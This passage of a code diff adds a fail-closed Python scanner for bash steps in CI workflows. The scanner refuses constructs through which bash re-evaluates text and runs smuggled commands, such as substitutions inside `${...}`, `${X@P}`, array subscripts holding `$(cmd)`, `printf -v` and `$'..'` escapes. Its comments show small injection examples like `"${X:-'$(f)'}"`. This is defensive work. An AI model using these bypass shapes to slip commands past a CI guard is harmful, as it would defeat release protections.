+FOR_PLAIN_WORD_RE = re.compile(r"[0-9]+|\{[0-9]+\.\.[0-9]+(?:\.\.[0-9]+)?\}")
+FOR_ARITH_HEADER_RE = re.compile(r"[A-Za-z0-9_ \t+\-*/%<>=!&|^~,()]*")
+ARITH_COMPARE = frozenset(("-eq", "-ne", "-lt", "-le", "-gt", "-ge"))
+DECLARE_WORDS = frozenset(("declare", "typeset", "local", "export", "readonly"))
+
+
+class ShellError(Exception):
+    """The script text is outside what the scanner understands (a step that fetches then fails closed)."""
+
+
+class XStr(str):
+    """Round 9 (F7, F1, F2, F6): a decoded shell word that remembers whether an expansion (`$name`, `${...}`, `$(...)`, a
+    backtick) took part in it. ``lit`` of a word is False for any quote, so a quoted literal and an expansion differ
+    only here."""
+
+    exp = True
+
+
+def is_exp(text: str) -> bool:
+    """True when the word ``text`` held an expansion, or is a plain str of unknown origin (then it is assumed to)."""
+    return bool(getattr(text, "exp", True))
+
+
+class ShellLevel:
+    """The parse state of one command list (the top level, a `$(...)`, a backtick or a `<(...)`)."""
+
+    def __init__(self) -> None:
+        self.cmd_pos = True
+        self.expect = ""
+        self.wordlist = False
+        self.for_name = ""  # Round 12: the loop variable whose word list is being read
+        self.skip = False
+        self.paren = 0
+        self.cases: List[str] = []
+        self.cur: Optional[List[Tuple[str, bool]]] = None
+        self.prev = "\n"  # the separator before the next command (Round 7, F3)
+        self.neg = False  # a command that follows `if`, `elif`, `while`, `until` or `!` is a condition
+        self.stack: List[str] = []  # open if / while / until / for / case / `{` constructs
+        self.kind = ""  # Round 9: the kind of the redirect whose target word is next ("<", ">" or "<<<")
+        self.last: Optional[int] = None  # index into ShellScan.info of the command the next separator ends
+        self.fn_next = False  # a function definition was just read, so the next `{` opens its body
+        self.dbl = False  # inside `[[ ... ]]`, where `(`, `)`, `&&` and `||` are operators of the test, not of the shell
+
+    def close(self) -> None:
+        if self.stack:
+            self.stack.pop()
+
+
+class ShellScan:
+    """Round 6: the command words of a shell script, comments and here-document bodies excluded. ``cmds`` holds
+    (word, literal, args) per command; a word is literal only when it has no quote, escape or expansion. ``words``
+    is the decoded text of every word, ``assigns`` the names assigned in command position."""
+
+    def __init__(self, text: str) -> None:
+        self.s = text.replace("\\\n", "")
+        self.n = len(self.s)
+        self.i = 0
+        self.cmds: List[Tuple[str, bool, List[Tuple[str, bool]]]] = []
+        self.words: List[str] = []
+        self.assigns: List[str] = []
+        self.heredocs = 0
+        self.pending: List[Tuple[str, bool, bool]] = []
+        # Round 7 (F3): per command, aligned with ``cmds``: the separators around it and whether it runs unconditionally
+        # at the top level; ``targets`` holds the redirect targets (and here-string words).
+        self.info: List[Dict[str, object]] = []
+        self.targets: List[str] = []
+        self.funcs: set = set()  # Round 8 (S8): the names `name()` defines in the script
+        self.xcount = 0  # Round 9: expansions read so far (a word is expanded when the count moved while it was read)
+        self.pre_redirs: List[Tuple[str, str]] = []  # redirects read before the command word they belong to
+        self.assign_vals: List[Tuple[str, str, bool]] = []  # Round 9 (F6): (name, value, expanded) per assignment
+        self.for_vars: List[str] = []  # Round 9 (F6): the loop variables of `for` and `select`
+        self.nest = 0
+        # Round 12 (code r11 F3): the re-evaluating contexts read while scanning (checked once the whole script is read).
+        self.arith_bodies: List[str] = []  # the text of every `$(( ))`
+        self.brace_names: List[str] = []  # `${!name}`: the name that is read as a name
+        self.brace_subs: List[Tuple[str, str]] = []  # `${name[expr]}`: (name, expr)
+        self.brace_offsets: List[str] = []  # `${name:off:len}`: each offset or length
+        self.nonlit: set = set()  # names given an array literal, a nameref, `${X:=..}`: never literal
+        self.assoc: set = set()  # names declared `-A`: their subscripts are strings, not arithmetic
+        self.all_assigns: List[Tuple[str, str, bool]] = []
+        self.for_bad: set = set()  # loop variables with a header whose words are not all plain numbers or numeric brace ranges
+        self.scan(None)
+        self.f3_error: Optional[ShellError] = None  # Round 12: the re-evaluation refusal, reported after every other check
+        try:
+            self.reeval_check()
+        except ShellError as err:
+            self.f3_error = err
+
+    def name_ok(self, name: str, seen: frozenset = frozenset()) -> bool:
+        """Round 12 (code r11 F3): True when every assignment of ``name`` in the script is a plain number, a quoted plain
+        string without `$` that is itself literal, or the result of a `$(( ))` (an integer by construction; the body is
+        checked on its own). A name never assigned here is literal (the `env:` rule reads what the step gives it)."""
+        if name in seen:
+            return True
+        if name in self.nonlit or (name in self.for_vars and name in self.for_bad) or (name.isdigit() and name != "0"):
+            return False
+        seen = seen | {name}
+        for n, val, exp in self.all_assigns:
+            if n != name:
+                continue
+            if val.startswith("\0+"):
+                val = val[2:]
+            if exp:
+                if val != "$(())":
+                    return False
+            elif "$" in val or "`" in val or not self.arith_ok(val, seen):
+                return False
+        return True
+
+    def arith_ok(self, text: str, seen: frozenset = frozenset()) -> bool:
+        """Round 12 (code r11 F3): ``text`` holds only blanks, numbers, operators and names (or `$name` references) that
+        are literal."""
+        pos = 0
+        while pos < len(text):
+            m = ARITH_TOKEN_RE.match(text, pos)
+            if m is None:
+                return False
+            name = m.group(1) or m.group(2) or m.group(3)
+            if name and not self.name_ok(name, seen):
+                return False
+            pos = m.end()
+        return True
+
+    def name_text_ok(self, text: str) -> bool:
+        """Round 12 (code r11 F3): ``text`` names a variable (`-v`, `declare -n`): a plain name is read as a name, never
+        as a value; anything else (a subscript, a `$name`) must hold literal operands."""
+        return re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", text) is not None or self.arith_ok(text)
+
+    def need(self, ok: bool, what: str, text: str) -> None:
+        if not ok:
+            raise ShellError(f"non-literal operand `{text[:40]}` in {what}: bash evaluates the text of a variable there as an "
+                             "arithmetic expression or a name, so only a plain number or a plain string is read (Round 12, code r11 F3)")
+
+    def reeval_check(self) -> None:
+        """Round 12 (code r11 F3): refuse a re-evaluating context on a non-literal operand, and `printf -v` outright.
+        Ordering (conductor decision): the refusal is recorded in ``f3_error`` and reported LAST, and only when the fetch-step,
+        run allow-list and env checks of the same step found nothing, so a step that breaks an older rule keeps that rule's
+        one message.
+        decision: refuse non-literal operands in every re-evaluating context and refuse $'..' escapes and printf -v outright over tracking provenance through concatenation and += because a data-flow analysis is exactly the parser this guard is designed not to be; the refusal is fail-closed and release.yml / c8-precheck.yml contain none of the refused shapes (quote the grep).
+        decision: count an assignment from `$(( ))` as a plain number over refusing it because the result of an arithmetic expansion is an integer by construction and its body is checked on its own; release.yml `emitted=$((emitted + 1))` is that shape."""
+        self.all_assigns = list(self.assign_vals)
+        for word, _lit, args in self.cmds:
+            if word not in DECLARE_WORDS:
+                continue
+            flags = "".join(a[1:] for a, _l in args if a.startswith("-") and len(a) > 1 and a[1] != "-")
+            for a, _l in args:
+                if a.startswith("-") and len(a) > 1:
+                    continue
+                nm, eq, val = a.partition("=")
+                if not eq and is_exp(a):
+                    raise ShellError(f"non-literal operand `{a[:40]}` of `{word}`: the options and names it reads are unknown "
+                                     "(Round 12, code r11 F3)")
+                if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", nm):
+                    continue
+                if eq:
+                    self.all_assigns.append((nm, val, is_exp(a)))
+                if word in ("declare", "typeset", "local"):
+                    if "A" in flags:
+                        self.assoc.add(nm)
+                    if "A" in flags or "a" in flags:
+                        self.nonlit.add(nm)
+                    if "n" in flags:
+                        self.nonlit.add(nm)
+                        tgt = re.match(r"\$?\{?([A-Za-z_][A-Za-z0-9_]*)", val)
+                        if tgt is not None:
+                            self.nonlit.add(tgt.group(1))
+        for body in self.arith_bodies:
+            self.need(self.arith_ok(body), "`$(( ))`", body)
+        for name in self.brace_names:
+            self.need(self.name_ok(name), "`${!name}`", name)
+        for name, expr in self.brace_subs:
+            if name not in self.assoc:
+                self.need(self.arith_ok(expr), f"the subscript of `${{{name}[...]}}`", expr)
+        for off in self.brace_offsets:
+            self.need(self.arith_ok(off), "a substring offset or length", off)
+        for word, _lit, args in self.cmds:
+            texts = [str(word)] + [str(a) for a, _l in args]
+            for k, w in enumerate(texts):
+                if w == "printf" and k + 1 < len(texts) and texts[k + 1].startswith("-v"):
+                    raise ShellError("`printf -v` assigns a name or text bash re-evaluates and is refused (Round 12, code r11 F3)")
+            if word in ("[[", "[", "test"):
+                for k, w in enumerate(texts[1:], 1):
+                    if w == "-v" and k + 1 < len(texts):
+                        self.need(self.name_text_ok(texts[k + 1]), f"`{word} -v`", texts[k + 1])
+                    elif word == "[[" and w in ARITH_COMPARE and 1 < k < len(texts) - 1:
+                        self.need(self.arith_ok(texts[k - 1]), f"`[[ {w} ]]`", texts[k - 1])
+                        self.need(self.arith_ok(texts[k + 1]), f"`[[ {w} ]]`", texts[k + 1])
+            if word in ("declare", "typeset", "local"):
+                flags = "".join(a[1:] for a, _l in args if a.startswith("-") and len(a) > 1 and a[1] != "-")
+                for a, _l in args:
+                    if a.startswith("-") and len(a) > 1:
+                        continue
+                    nm, _eq, val = a.partition("=")
+                    if "i" in flags:
+                        self.need(self.name_ok(nm) and self.arith_ok(val), f"`{word} -i`", a)
+                    if "n" in flags:
+                        self.need(self.name_text_ok(val), f"`{word} -n`", a)
+
+    def word(self, text: str, lit: bool, lv: ShellLevel) -> None:
+        self.words.append(text)
+        if lv.skip:
+            lv.skip = False
+            self.targets.append(text)
+            if lv.cur is not None and lv.last is not None:
+                self.info[lv.last]["redirs"].append((lv.kind, text))  # type: ignore[union-attr]
+            else:
+                self.pre_redirs.append((lv.kind, text))
+            return
+        if lv.cases and lv.cases[-1] == "pat":
+            if lit and text == "esac":
+                lv.cases.pop()
+                lv.close()
+                lv.cmd_pos = False
+            return
+        ex, lv.expect = lv.expect, ""
+        if ex == "for_var":
+            lv.expect = "for_in"
+            self.for_vars.append(str(text))
+            lv.for_name = str(text)
+            return
+        if ex == "for_in" and lit and text == "in":
+            lv.wordlist = True
+            return
+        if ex == "case_subj":
+            lv.expect = "case_in"
+            return
+        if ex == "case_in" and lit and text == "in":
+            lv.cases.append("pat")
+            lv.stack.append("case")
+            return
+        if lv.wordlist:
+            if not (lit and FOR_PLAIN_WORD_RE.fullmatch(str(text))):
+                self.for_bad.add(lv.for_name)
+            return
+        if not lv.cmd_pos:
+            if lv.cur is not None:
+                lv.cur.append((text, lit))
+            if lv.dbl and lit and text == "]]":
+                lv.dbl = False
+            return
+        m = SHELL_ASSIGN_RE.match(text)
+        if m is not None:
+            self.assigns.append(m.group(1))
+            self.assign_vals.append((m.group(1), ("\0+" if m.group(0).endswith("+=") else "") + str(text[m.end():]), is_exp(text)))
+            return
+        if lit and text in SHELL_CMD_KW:
+            if text in ("if", "elif", "while", "until", "!"):
+                lv.neg = True
+            if text in ("if", "while", "until", "{"):
+                lv.stack.append("fn" if text == "{" and lv.fn_next else text)  # Round 8 (C2): a function body is not top level
+                lv.fn_next = False
+            return
+        if lit and text in ("for", "select"):
+            lv.expect, lv.cmd_pos = "for_var", False
+            lv.stack.append("for")
+            return
+        if lit and text == "case":
+            lv.expect, lv.cmd_pos = "case_subj", False
+            return
+        if lit and text == "esac" and lv.cases:
+            lv.cases.pop()
+            lv.close()
+            lv.cmd_pos = False
+            return
+        if lit and (text in SHELL_END_KW or text in SHELL_NOOP):
+            if text in SHELL_END_KW:
+                lv.close()
+            lv.cmd_pos = False
+            return
+        lv.cur = []
+        top = self.nest == 0 and lv.paren == 0 and not any(k in ("if", "while", "until", "case", "fn") for k in lv.stack)
+        self.info.append({"prev": lv.prev, "nxt": "", "neg": lv.neg, "top": top, "sub": self.nest > 0,
+                          "redirs": self.pre_redirs})
+        self.pre_redirs = []
+        lv.last, lv.neg = len(self.info) - 1, False
+        self.cmds.append((text, lit, lv.cur))
+        lv.cmd_pos = False
+        lv.dbl = lit and text == "[["
+
+    def separator(self, lv: ShellLevel, op: str) -> None:
+        if lv.expect == "for_in" and lv.for_name:
+            self.for_bad.add(lv.for_name)  # `for x;` iterates the positional parameters
+        lv.dbl = False
+        lv.cmd_pos, lv.wordlist, lv.skip, lv.expect, lv.cur = True, False, False, "", None
+        if lv.last is not None:
+            self.info[lv.last]["nxt"] = op
+            lv.last = None
+        lv.prev = op
+        if op == ";;" and lv.cases:
+            lv.cases[-1] = "pat"
+
+    def newline(self, lv: ShellLevel) -> None:
+        self.separator(lv, "\n")
+        while self.pending:
+            delim, strip, quoted = self.pending.pop(0)
+            body: List[str] = []
+            while True:
+                if self.i >= self.n:
+                    raise ShellError("here-document not terminated")
+                j = self.s.find("\n", self.i)
+                line = self.s[self.i:self.n if j < 0 else j]
+                self.i = self.n if j < 0 else j + 1
+                if (line.lstrip("\t") if strip else line) == delim:
+                    break
+                body.append(line)
+            text = "\n".join(body)
+            # Round 11 (code r10 F2): bash expands the body of a here-document whose delimiter has no quote or backslash,
+            # so a `$( )`, a backtick and a `${X@P}` in it run; the body is scanned as double-quoted text. A quoted
+            # delimiter keeps the body literal.
+            # decision: scan unquoted heredoc bodies as double-quoted text over refusing heredocs because release.yml's own steps use literal heredocs
+            self.words.append(text if quoted else self.heredoc_text(text))
+
+    def heredoc_text(self, body: str) -> str:
+        """Round 11 (code r10 F2): the expansion of an unquoted here-document body, read like the inside of double quotes
+        without the closing quote (a `"` is plain text); every expansion in it is scanned."""
+        saved, rest = (self.s, self.n, self.i), self.pending
+        self.s, self.n, self.i, self.pending = body, len(body), 0, []
+        out: List[str] = []
+        try:
+            while self.i < self.n:
+                c = self.s[self.i]
+                if c == "\\" and self.i + 1 < self.n:
+                    out.append(self.s[self.i + 1])
+                    self.i += 2
+                elif c == "$":
+                    out.append(self.dollar())
+                elif c == "`":
+                    self.i += 1
+                    self.xcount += 1
+                    self.scan("`")
+                    out.append("`")
+                else:
+                    out.append(c)
+                    self.i += 1
+        finally:
+            self.s, self.n, self.i = saved
+            self.pending = rest
+        return "".join(out)
+
+    def operator(self, lv: ShellLevel) -> None:
+        two = self.s[self.i:self.i + 2]
+        if two == "&>":
+            self.i += 1
+            self.redirect(lv)
+        elif two in ("&&", "||", ";;", ";&", "|&"):
+            self.i += 2
+            self.separator(lv, two)
+        else:
+            self.i += 1
+            self.separator(lv, two[0])
+
+    def heredoc_delim(self) -> Tuple[str, bool]:
+        """Round 12 (code r11 F1): the delimiter is a plain `[A-Za-z0-9_]+` word, alone, wrapped WHOLE in one quote pair or
+        after one backslash. Bash removes the quotes of the whole word before it compares lines, so any other spelling
+        (a quote inside the word, a backslash-escaped blank, `$'..'`, `$"..."`) ends the body at a line the scanner cannot
+        name; it is refused with the word quoted.
+        decision: refuse every delimiter that is not a plain word in one whole quote pair over reading the delimiter as bash does because the fail-closed refuse-what-you-cannot-prove precedent (PR 8252 exact-body pin; round 11 "refuse subscript text") ends the class without a shell word lexer, and release.yml / c8-precheck.yml use only plain delimiters (quote the grep that proves it)."""
+        while self.i < self.n and self.s[self.i] in " \t":
+            self.i += 1
+        j = self.i
+        while j < self.n and self.s[j] not in HEREDOC_DELIM_END:
+            j += 1
+        raw = self.s[self.i:j]
+        if not raw:
+            raise ShellError("here-document without a delimiter")
+        m = HEREDOC_DELIM_RE.fullmatch(raw)
+        if m is None:
+            raise ShellError(f"here-document delimiter `{raw[:40]}` is not a plain word (Round 12, code r11 F1: only a plain "
+                             "[A-Za-z0-9_]+ word, alone, in one whole quote pair or after one backslash is read)")
+        self.i = j
+        return raw.strip("'\"\\"), raw[0] in "'\"\\"
+
+    def redirect(self, lv: ShellLevel) -> None:
+        s, i = self.s, self.i
+        lv.kind = ">" if s[i] == ">" else "<"
+        if s[i:i + 3] == "<<<":
+            self.i += 3
+            lv.kind = "<<<"
+            lv.skip = True
+        elif s[i:i + 2] == "<<":
+            self.i += 2
+            strip = s[self.i:self.i + 1] == "-"
+            self.i += 1 if strip else 0
+            delim, quoted = self.heredoc_delim()
+            self.pending.append((delim, strip, quoted))
+            self.heredocs += 1
+        elif s[i:i + 2] in ("<(", ">("):
+            self.i += 2
+            self.scan(")")
+            lv.skip = False
+        else:
+            self.i += 1
+            if s[self.i:self.i + 1] in (">", "|", "&", "<") if s[i] == ">" else s[self.i:self.i + 1] in ("&", ">"):
+                self.i += 1
+            lv.skip = True
+
+    def quoted_span(self, j: int) -> int:
+        """Round 11 (code r10 F1): the index after the quoted span that opens at ``j`` inside a `${...}`. The span is scanned
+        with the rules of the word around it: a `$( )`, a backtick and a nested `${ }` stay live in both quote kinds.
+        decision: treat a single-quoted span inside `${...}` as live over skipping it because bash does not quote inside a
+        default word that sits in double quotes (bash manual, Shell Parameter Expansion and Quoting), so `"${X:-'$(f)'}"` runs f."""
+        s, q = self.s, self.s[j]
+        j += 1
+        while j < self.n:
+            c = s[j]
+            if c == q:
+                return j + 1
+            if c == "\\" and q == '"':
+                j += 1
+            elif c == "`" or s[j:j + 2] == "$(":
+                raise ShellError("command substitution inside `${...}`")
+            elif s[j:j + 2] == "${":
+                j = self.braced(j + 2)
+                continue
+            j += 1
+        raise ShellError("unterminated quote in `${...}`")
+
+    def braced(self, j: int) -> int:
+        """The index after the `}` that closes a `${` whose body starts at ``j``."""
+        s, depth = self.s, 1
+        start = j
+        # Round 11 (code r10 F3): `@` is an operator only where bash reads one, right after the parameter name or its
+        # subscript (`${name@op}`, `${name[i]@op}`, `${!name@op}`); after `:-`, `#`, `%`, `/` and the like it is word text.
+        op = j + 1 if s[j:j + 1] in ("!", "#") and s[j + 1:j + 2] not in ("", "}") else j
+        if s[op:op + 1].isalpha() or s[op:op + 1] == "_":
+            while op < self.n and (s[op].isalnum() or s[op] == "_"):
+                op += 1
+        elif s[op:op + 1].isdigit():
+            while op < self.n and s[op].isdigit():
+                op += 1
+        elif s[op:op + 1] and s[op] in "@*#?$!-":
+            op += 1
+        sub = 0
+        while j < self.n:
+            c = s[j]
+            if c == "\\":
+                j += 1
+            elif c in "'\"":
+                j = self.quoted_span(j)
+                continue
+            elif c == "`" or s[j:j + 2] == "$(":
+                raise ShellError("command substitution inside `${...}`")
+            elif s[j:j + 2] == "${":
+                j = self.braced(j + 2)
+                continue
+            elif c == "[" and j == op and not sub:
+                sub = 1
+            elif c == "[" and sub:
+                sub += 1
+            elif c == "]" and sub:
+                sub -= 1
+                if not sub:
+                    op = j + 1
+            elif c == "@" and j == op and s[j + 1:j + 2] != "" and s[j + 1] in TRANSFORM_LETTERS:
+                # Round 10 (sec r9 F1): `${name@P}` and its siblings re-evaluate the value (a command substitution in it runs).
+                # decision: refuse every @-transformation operator over refusing @P alone because the scanner cannot know
+                # which operators a future bash re-evaluates, and the guard is fail-closed by design.
+                raise ShellError(f"parameter transformation `${{...@{s[j + 1]}}}` re-evaluates the value")
+            elif c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    self.brace_body(s[start:j])
+                    return j + 1
+            j += 1
+        raise ShellError("unterminated `${`")
+
+    def brace_body(self, b: str) -> None:
+        """Round 12 (code r11 F3): note the parts of a `${...}` body that bash evaluates: the name of `${!name}`, the
+        subscript of `${name[expr]}` and the offset and length of `${name:off:len}`; `${name:=..}` makes the name non-literal."""
+        ind = re.match(r"!([A-Za-z_][A-Za-z0-9_]*|[0-9]+)(.*)", b, re.S)
+        if ind is not None:
+            name, rest = ind.groups()
+            if rest in ("*", "@", "[@]", "[*]"):
+                return  # a listing of names or of keys: nothing is evaluated
+            self.brace_names.append(name)
+            if rest.startswith("["):
+                self.brace_subs.append((name, rest[1:rest.rfind("]")] if "]" in rest else rest[1:]))
+            return
+        m = re.match(r"#?([A-Za-z_][A-Za-z0-9_]*|[@*]|[0-9]+)", b)
+        if m is None:
+            return
+        name, pos = m.group(1), m.end()
+        if b[pos:pos + 1] == "[":
+            depth, q = 0, pos
+            while q < len(b):
+                depth += 1 if b[q] == "[" else -1 if b[q] == "]" else 0
+                if depth == 0:
+                    break
+                q += 1
+            expr = b[pos + 1:q]
+            pos = q + 1
+            if expr not in ("@", "*"):
+                self.brace_subs.append((name, expr))
+        if b[pos:pos + 2] == ":=" or b[pos:pos + 1] == "=":
+            self.nonlit.add(name)
+        elif b[pos:pos + 1] == ":" and b[pos + 1:pos + 2] not in ("-", "=", "+", "?"):
+            self.brace_offsets.extend(b[pos + 1:].split(":"))
+
+    def arithmetic(self, j: int) -> bool:
+        """True when the `$((` whose body starts at ``j`` closes with an adjacent `))`; otherwise bash reads it as the
+        command substitution `$( (...) ...)` and so does the scanner."""
+        s, depth = self.s, 2
+        while j < self.n:
+            if s[j] == "(":
+                depth += 1
+            elif s[j] == ")":
+                if depth == 2 and s[j + 1:j + 2] != ")":
+                    return False
+                depth -= 1
+                if depth == 0:
+                    return True
+            j += 1
+        raise ShellError("unterminated `$((`")
+
+    def c_style_for(self, lv: ShellLevel) -> None:
+        """Round 12 (code r11 F3, conductor decision): ``for (( init; cond; step ))``. The header makes its variable
+        literal only when the three expressions hold nothing but plain numbers, that variable and arithmetic operators;
+        any other character (`$`, a quote, a backtick) is refused as text the scanner cannot read."""
+        s, j, depth = self.s, self.i + 1, 2
+        while j < self.n and depth:
+            depth += {"(": 1, ")": -1}.get(s[j], 0)
+            j += 1
+        body = s[self.i + 1:j - 2]
+        parts = body.split(";")
+        init = re.fullmatch(r"\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*[0-9]+\s*", parts[0]) if len(parts) == 3 else None
+        if init is None or FOR_ARITH_HEADER_RE.fullmatch(body.replace(";", " ")) is None:
+            raise ShellError(f"`for (( {body[:40]} ))` header is not a plain-number loop: only `NAME=N; test; step` over plain "
+                             "numbers, that name and arithmetic operators is read (Round 12, code r11 F3)")
+        name = init.group(1)
+        for part in parts[1:]:
+            for m in re.finditer(r"[A-Za-z_][A-Za-z0-9_]*", part):
+                if m.group(0) != name:
+                    self.for_bad.add(name)
+        self.for_vars.append(name)
+        self.i = j
+        lv.expect = ""
+
+    def walk_arithmetic(self, i: int) -> str:
+        """Round 7 (N1): the body of `$(( ))` is walked, so a `$( )`, a backtick or a `${ }` inside it is scanned."""
+        s, j, depth = self.s, i + 3, 2
+        while j < self.n and depth:
+            c = s[j]
+            if s[j:j + 2] == "$(" and s[j:j + 3] != "$((":
+                self.i = j + 2
+                self.scan(")")
+                j = self.i
+                continue
+            if s[j:j + 2] == "${":
+                j = self.braced(j + 2)
+                continue
+            if c == "`":
+                self.i = j + 1
+                self.scan("`")
+                j = self.i
+                continue
+            if c == '"':
+                self.i = j + 1
+                self.dquote()
+                j = self.i
+                continue
+            if c == "'":
+                j = s.find("'", j + 1)
+                if j < 0:
+                    raise ShellError("unterminated quote in `$(( ))`")
+            depth += 1 if c == "(" else -1 if c == ")" else 0
+            j += 1
+        if depth:
+            raise ShellError("unterminated `$((`")
+        self.arith_bodies.append(s[i + 3:j - 2])
+        self.i = j
+        return "$(())"
+
+    def dollar(self, bare: bool = False) -> str:
+        s, i = self.s, self.i
+        self.xcount += 1
+        nxt = s[i + 1:i + 2]
+        if bare and nxt == "'":
+            # Round 12 (code r11 F3): bash decodes `$'..'` escapes (`\x24` is a dollar), so the text it builds is never the
+            # text the scanner read. A `$'..'` with a backslash before its first closing quote is refused.
+            end = s.find("'", i + 2)
+            if end >= 0 and "\\" in s[i + 2:end]:
+                raise ShellError("ANSI-C quoting `$'..'` with an escape is decoded by bash into text the scanner cannot read "
+                                 "(Round 12, code r11 F3)")
+        if s[i + 1:i + 3] == "((" and self.arithmetic(i + 3):
+            return self.walk_arithmetic(i)
+        if nxt == "(":
+            self.i += 2
+            self.scan(")")
+            return "$()"
+        if nxt == "{":
+            self.i = self.braced(i + 2)
+            return s[i:self.i]
+        if nxt.isalpha() or nxt == "_":
+            j = i + 1
+            while j < self.n and (s[j].isalnum() or s[j] == "_"):
+                j += 1
+            self.i = j
+            return s[i:j]
+        if nxt and (nxt.isdigit() or nxt in "#?@*!$-"):
+            self.i += 2
+            return s[i:i + 2]
+        self.i += 1
+        return "$"
+
+    def dquote(self) -> str:
+        s, out = self.s, []
+        while self.i < self.n:
+            c = s[self.i]
+            if c == '"':
+                self.i += 1
+                return "".join(out)
+            if c == "\\" and self.i + 1 < self.n:
+                out.append(s[self.i + 1])
+                self.i += 2
+            elif c == "$":
+                out.append(self.dollar())
+            elif c == "`":
+                self.i += 1
+                self.xcount += 1
+                self.scan("`")
+                out.append("`")
+            else:
+                out.append(c)
+                self.i += 1
+        raise ShellError("unterminated double quote")
+
+    def array_literal(self) -> bool:
+        """Round 8: the body of `NAME=( ... )` (the scanner is just past the `(`) is data when it holds no command
+        substitution or backtick; the cursor moves past the closing `)`. False leaves the cursor in place."""
+        j, quote = self.i, ""
+        while j < self.n:
+            ch = self.s[j]
+            if quote:
+                if ch == quote:
+                    quote = ""
+                elif ch == "\\" and quote == '"':
+                    j += 1
+            elif ch in "'\"":
+                quote = ch
+            elif ch == "\\":
+                j += 1
+            elif ch == "`" or self.s.startswith("$(", j):
+                return False
+            elif ch == ")":
+                self.i = j + 1
+                return True
+            j += 1
+        return False
+
+    def scan(self, closer: Optional[str]) -> None:
+        if closer is None:
+            self.walk(None)
+            return
+        self.nest += 1
+        self.walk(closer)
+        self.nest -= 1
+
+    def walk(self, closer: Optional[str]) -> None:
+        s, lv = self.s, ShellLevel()
+        buf: List[str] = []
+        lit, have = True, False
+        mark = self.xcount
+
+        def end_word() -> None:
+            nonlocal buf, lit, have, mark
+            if have:
+                word = XStr("".join(buf))
+                # Round 11 (sec r10 F2): a quoted word such as `a[$(cmd)]` is data when assigned, but bash re-evaluates an
+                # array subscript in `$(( X ))`, `declare -n`, `${!X}`, `${ary[X]}`, `[[ X -eq 0 ]]`, `printf -v`, `test -v`,
+                # `declare -i` and `${S:X:1}`, and the command then runs outside the run allow-list.
+                # decision: refuse subscript text holding a substitution inside quoted values over tracking every re-evaluating context because bash re-evaluates such subscripts in nine distinct places and the allow-list cannot see any of them
+                if SUBSCRIPT_SUBST_RE.search(word):
+                    raise ShellError("array subscript holding a substitution is re-evaluated by bash")
+                word.exp = self.xcount != mark
+                self.word(word, lit, lv)
+            buf, lit, have, mark = [], True, False, self.xcount
+
+        while True:
+            if self.i >= self.n:
+                end_word()
+                if closer is not None:
+                    raise ShellError("unterminated command substitution")
+                if self.pending:
+                    raise ShellError("here-document body missing")
+                return
+            c = s[self.i]
+            if c == "\\":
+                if self.i + 1 >= self.n:
+                    raise ShellError("trailing backslash")
+                buf.append(s[self.i + 1])
+                lit, have = False, True
+                self.i += 2
+            elif c == "'":
+                j = s.find("'", self.i + 1)
+                if j < 0:
+                    raise ShellError("unterminated single quote")
+                buf.append(s[self.i + 1:j])
+                lit, have = False, True
+                self.i = j + 1
+            elif c == '"':
+                self.i += 1
+                buf.append(self.dquote())
+                lit, have = False, True
+            elif c == "$":
+                buf.append(self.dollar(True))
+                lit, have = False, True
+            elif c == "`":
+                self.i += 1
+                if closer == "`":
+                    end_word()
+                    return
+                self.xcount += 1
+                self.scan("`")
+                buf.append("`")
+                lit, have = False, True
+            elif c == "#" and not have:
+                j = s.find("\n", self.i)
+                self.i = self.n if j < 0 else j
+            elif c in " \t":
+                end_word()
+                self.i += 1
+            elif c == "\n":
+                end_word()
+                self.i += 1
+                self.newline(lv)
+            elif c in "&|" and lv.dbl and s.startswith(("&&", "||"), self.i):
+                end_word()
+                self.word(s[self.i:self.i + 2], True, lv)
+                self.i += 2
+            elif c in "()" and lv.dbl:  # a group or an extended-regex paren of the test
+                buf.append(c)
+                lit, have = False, True
+                self.i += 1
+            elif c in ";&|":
+                end_word()
+                self.operator(lv)
+            elif c == "(":
+                end_word()
+                self.i += 1
+                if lv.cases and lv.cases[-1] == "pat":
+                    continue
+                paren_at = self.i
+                if s[self.i - 2:self.i - 1] == "=" and self.array_literal():
+                    an = re.search(r"([A-Za-z_][A-Za-z0-9_]*)\+?=\($", s[:paren_at])
+                    if an is not None:
+                        self.nonlit.add(an.group(1))
+                    continue
+                if lv.cmd_pos and s[self.i:self.i + 1] == "(" and self.arithmetic(self.i + 1):
+                    raise ShellError("`(( ))` evaluates its body as arithmetic and is refused (Round 12, code r11 F3)")
+                if lv.expect == "for_var" and s[self.i:self.i + 1] == "(" and self.arithmetic(self.i + 1):
+                    self.c_style_for(lv)
+                    continue
+                if not lv.cmd_pos:
+                    name = self.cmds[-1] if self.cmds else None
+                    if (name is not None and lv.cur is name[2] and not lv.cur and name[1] and lv.last is not None
+                            and re.fullmatch(r"\w+", name[0]) and re.match(r"[ \t]*\)", s[self.i:])):
+                        # `name()` opens a function definition: the name is not a command, its body is scanned in place
+                        self.funcs.add(self.cmds.pop()[0])
+                        self.info.pop()
+                        self.i += re.match(r"[ \t]*\)", s[self.i:]).end()  # type: ignore[union-attr]
+                        lv.last, lv.cur, lv.cmd_pos, lv.fn_next = None, None, True, True
+                        continue
+                    raise ShellError("unexpected `(`")
+                lv.paren += 1
+            elif c == ")":
+                end_word()
+                self.i += 1
+                if lv.cases and lv.cases[-1] == "pat":
+                    lv.cases[-1], lv.cmd_pos = "body", True
+                elif lv.paren > 0:
+                    lv.paren -= 1
+                    lv.cmd_pos = False
+                elif closer == ")":
+                    return
+                else:
+                    raise ShellError("unbalanced `)`")
+            elif c in "<>":
+                if have and lit and "".join(buf).isdigit():
+                    buf, lit, have = [], True, False
+                else:
+                    end_word()
+                self.redirect(lv)
+            else:
+                buf.append(c)
+                have = True
+                self.i += 1
+
+
+def norm_name(text: str) -> str:
+    """A fetched or named file with `${VAR}` folded to `$VAR`, so the two spellings of one variable compare equal."""
+    return re.sub(r"\$\{(\w+)\}", r"$\1", text)
+
+
+def is_verify(word: str, args: List[Tuple[str, bool]]) -> bool:
+    """sha256sum or shasum in check mode (`-c`, `--check` or a short cluster holding `c`)."""
+    if word not in FETCH_VERIFIERS:
+        return False
+    return any(a == "--check" or (a.startswith("-") and not a.startswith("--") and "c" in a[1:]) for a, _l in args)
+
+
